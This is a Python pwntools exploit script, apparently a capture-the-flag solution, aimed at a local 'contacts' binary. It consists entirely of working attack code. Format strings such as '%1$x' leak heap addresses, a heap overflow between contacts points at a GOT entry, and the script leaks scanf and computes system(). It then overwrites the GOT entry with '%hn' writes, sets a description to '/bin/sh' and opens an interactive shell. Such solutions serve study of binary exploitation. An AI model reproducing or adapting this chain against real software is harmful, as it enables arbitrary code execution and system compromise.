#Import pwntools
from pwn import *

#Establish the process
target = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

#Create the first contact
target.recvuntil(">>>")
target.sendline("1")
target.sendline("guy0")
target.sendline("0123456789")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the second contact 
target.sendline("1")
target.sendline("guy1")
target.sendline("4685790123")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the third contact
target.sendline("1")
target.sendline("guy2")
target.sendline("1356984280")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the fourth contact
target.sendline("1")
target.sendline("guy3")
target.sendline("6310279584")
target.sendline("50")
target.sendline("%1$x")
print target.recvuntil(">>>")

#Create the fifth contact
target.sendline("1")
target.sendline("guy4")
target.sendline("2759830416")
target.sendline("50")
target.sendline("desc")
print target.recvuntil(">>>")

#Print the description, and grab the leaked addresses
target.sendline("4")
print target.recvuntil("Phone #: 0123456789\n")
hleak0 = target.recvline()
print target.recvuntil("Phone #: 4685790123\n")
hleak1 = target.recvline()
print target.recvuntil("Phone #: 1356984280\n")
hleak2 = target.recvline()
print target.recvuntil("Phone #: 6310279584\n")
hleak3 = target.recvline()
print target.recvuntil(">>>")

#Filter out the leaked addresses
hleak0 = hleak0.replace("Description: ", "")[1:]
hleak1 = hleak1.replace("Description: ", "")[1:]
hleak2 = hleak2.replace("Description: ", "")[1:]
hleak3 = hleak3.replace("Description: ", "")[1:]

hleak0 = hleak0.replace(" ", "")
hleak1 = hleak1.replace(" ", "")
hleak2 = hleak2.replace(" ", "")
hleak3 = hleak3.replace(" ", "")

hleak0 = "0x" + hleak0
hleak1 = "0x" + hleak1
hleak2 = "0x" + hleak2
hleak3 = "0x" + hleak3

hleak0 = int(hleak0, 16)
hleak1 = int(hleak1, 16)
hleak2 = int(hleak2, 16)
hleak3 = int(hleak3, 16)

#Edit the guy0 contact, and execute the heap overflow into guy1
target.sendline("3")
target.sendline("guy0")
target.sendline("1")
print target.recvuntil(">>>")
payload = "0"*64 + p32(0x4) + p32(0x1) + p32(hleak1 + 16) + p32(0x804b014) + p32(0x31797567) + "\x00"
target.sendline(payload)
print target.recvuntil(">>>")

#Display the contacts to get the leak
target.sendline("4")
print target.recvuntil("Length 50\n")
scanf_leak = target.recvline()
print target.recvuntil(">>>")

#Filter out the address from the leak
scanf_leak = scanf_leak.replace("Phone #:", "")[4:]
scanf_leak = hex(u64(scanf_leak[39:]))
scanf_leak = scanf_leak[3:]
scanf_leak = scanf_leak[:-6]
scanf_leak = int("0x" + scanf_leak, 16)

#Calculate the system address, and split it into the two seprate parts
sys_adr = scanf_leak - 136624
s1, s2 = hex(sys_adr)[:6], hex(sys_adr)[6:]
s2 = "0x" + s2
s1 = int(s1, 16)
s2 = int(s2, 16)

#Overflow guy2 into guy3
target.sendline("3")
target.sendline("guy2")
target.sendline("1")
print target.recvuntil(">>>")
payload = "1"*64 + p32(0x4) + p32(0x1) + p32(hleak2 + 16) + "\x16\xb0\x04\x08" + p32(0x33797567) + "\x00" 
target.send(payload)

#Change the descriptions of guy1 and guy3to the fmt string
target.sendline("3")
target.sendline("guy1")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("%" + str(s2) + "x%1$hn")
print target.recvuntil(">>>")

target.sendline("3")
target.sendline("guy3")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("%" + str(s1) + "x%1$hn")
#target.sendline("1234")
print target.recvuntil(">>>")

#Change the description of guy4 to /bin/sh
target.sendline("3")
target.sendline("guy4")
target.sendline("2")
print target.recvuntil(">>>")
target.sendline("50")
target.sendline("/bin/sh")
print target.recvuntil(">>>")

#Print the needed information
print "leak0: this has chaned" + hex(hleak0)
print "leak1: " + hex(hleak1)
print "scanf: " + hex(scanf_leak)
print "system: " + hex(sys_adr)
print "s1: " + hex(s1) + " " + str(s1)
print "s2: " + hex(s2) + " " + str(s2)

#Drop to an interactive shell and hand the process over to gdb
#gdb.attach(target)
target.interactive()
